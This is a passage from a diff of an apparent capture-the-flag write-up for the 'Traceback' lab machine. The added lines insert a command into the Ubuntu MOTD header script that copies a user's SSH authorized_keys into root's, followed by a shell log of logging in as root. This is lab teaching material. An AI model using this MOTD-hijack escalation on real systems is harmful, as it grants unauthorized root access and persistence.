-         --------&nbsp;OWNED&nbsp;BY&nbsp;XH4H&nbsp;&nbsp;---------
-         -&nbsp;I&nbsp;guess&nbsp;stuff&nbsp;could&nbsp;have&nbsp;been&nbsp;configured&nbsp;better&nbsp;^^&nbsp;-
-         #################################
-         Welcome&nbsp;to&nbsp;Xh4H&nbsp;land
-         Failed&nbsp;to&nbsp;connect&nbsp;to&nbsp;https://changelogs.ubuntu.com/meta-release-lts.&nbsp;Check&nbsp;your&nbsp;Internet&nbsp;connection&nbsp;or&nbsp;proxy&nbsp;settings
-         Last&nbsp;login:&nbsp;Fri&nbsp;Jan&nbsp;24&nbsp;03:43:29&nbsp;2020
-         root@traceback:~#&nbsp;id
-         uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)
-         root@traceback:~#
-         </code></pre>
+        <pre><code class="language-bash">#!/bin/bash
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;00-header&nbsp;-&nbsp;create&nbsp;the&nbsp;header&nbsp;of&nbsp;the&nbsp;MOTD
+#&nbsp;&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2009-2010&nbsp;Canonical&nbsp;Ltd.
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;Authors:&nbsp;Dustin&nbsp;Kirkland&nbsp;&lt;kirkland@canonical.com&gt;
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;free&nbsp;software;&nbsp;you&nbsp;can&nbsp;redistribute&nbsp;it&nbsp;and/or&nbsp;modify
+#&nbsp;&nbsp;&nbsp;&nbsp;it&nbsp;under&nbsp;the&nbsp;terms&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;as&nbsp;published&nbsp;by
+#&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation;&nbsp;either&nbsp;version&nbsp;2&nbsp;of&nbsp;the&nbsp;License,&nbsp;or
+#&nbsp;&nbsp;&nbsp;&nbsp;(at&nbsp;your&nbsp;option)&nbsp;any&nbsp;later&nbsp;version.
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;distributed&nbsp;in&nbsp;the&nbsp;hope&nbsp;that&nbsp;it&nbsp;will&nbsp;be&nbsp;useful,
+#&nbsp;&nbsp;&nbsp;&nbsp;but&nbsp;WITHOUT&nbsp;ANY&nbsp;WARRANTY;&nbsp;without&nbsp;even&nbsp;the&nbsp;implied&nbsp;warranty&nbsp;of
+#&nbsp;&nbsp;&nbsp;&nbsp;MERCHANTABILITY&nbsp;or&nbsp;FITNESS&nbsp;FOR&nbsp;A&nbsp;PARTICULAR&nbsp;PURPOSE.&nbsp;&nbsp;See&nbsp;the
+#&nbsp;&nbsp;&nbsp;&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;for&nbsp;more&nbsp;details.
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;You&nbsp;should&nbsp;have&nbsp;received&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;along
+#&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;this&nbsp;program;&nbsp;if&nbsp;not,&nbsp;write&nbsp;to&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation,&nbsp;Inc.,
+#&nbsp;&nbsp;&nbsp;&nbsp;51&nbsp;Franklin&nbsp;Street,&nbsp;Fifth&nbsp;Floor,&nbsp;Boston,&nbsp;MA&nbsp;02110-1301&nbsp;USA.
+[&nbsp;-r&nbsp;/etc/lsb-release&nbsp;]&nbsp;&amp;&amp;&nbsp;.&nbsp;/etc/lsb-release
+echo&nbsp;"\nWelcome&nbsp;to&nbsp;Xh4H&nbsp;land&nbsp;\n"
+cp&nbsp;/home/sysadmin/.ssh/authorized_keys&nbsp;/root/.ssh/authorized_keys
+echo&nbsp;'try&nbsp;logging&nbsp;in&nbsp;as&nbsp;root&nbsp;\n'</code></pre>
+        <pre><code class="language-shell">matt@kali:~/.ssh$&nbsp;ssh&nbsp;-i&nbsp;id_rsa&nbsp;sysadmin@10.10.10.181
+#################################
+--------&nbsp;OWNED&nbsp;BY&nbsp;XH4H&nbsp;&nbsp;---------
+-&nbsp;I&nbsp;guess&nbsp;stuff&nbsp;could&nbsp;have&nbsp;been&nbsp;configured&nbsp;better&nbsp;^^&nbsp;-
+#################################
+\nWelcome&nbsp;to&nbsp;Xh4H&nbsp;land&nbsp;\n
+try&nbsp;logging&nbsp;in&nbsp;as&nbsp;root&nbsp;\n
+Failed&nbsp;to&nbsp;connect&nbsp;to&nbsp;https://changelogs.ubuntu.com/meta-release-lts.&nbsp;Check&nbsp;your&nbsp;Internet&nbsp;connection&nbsp;or&nbsp;proxy&nbsp;settings
+Last&nbsp;login:&nbsp;Sat&nbsp;Jun&nbsp;27&nbsp;09:29:38&nbsp;2020&nbsp;from&nbsp;10.10.14.35
+$&nbsp;exit
+Connection&nbsp;to&nbsp;10.10.10.181&nbsp;closed.
+matt@kali:~/.ssh$&nbsp;ssh&nbsp;-i&nbsp;id_rsa&nbsp;root@10.10.10.181
+#################################
+--------&nbsp;OWNED&nbsp;BY&nbsp;XH4H&nbsp;&nbsp;---------
+-&nbsp;I&nbsp;guess&nbsp;stuff&nbsp;could&nbsp;have&nbsp;been&nbsp;configured&nbsp;better&nbsp;^^&nbsp;-
+#################################
+Welcome&nbsp;to&nbsp;Xh4H&nbsp;land
+Failed&nbsp;to&nbsp;connect&nbsp;to&nbsp;https://changelogs.ubuntu.com/meta-release-lts.&nbsp;Check&nbsp;your&nbsp;Internet&nbsp;connection&nbsp;or&nbsp;proxy&nbsp;settings
+Last&nbsp;login:&nbsp;Fri&nbsp;Jan&nbsp;24&nbsp;03:43:29&nbsp;2020
+root@traceback:~#&nbsp;id
+uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)
+root@traceback:~#</code></pre>
         <div>
         <h2>Discussion</h2>
         <p>As this box was simpler than some of the others I've done in the past, I'll try to keep this section pretty short. There are two relevant discussion topics for this box, both of which related to privilege escalation.</p>
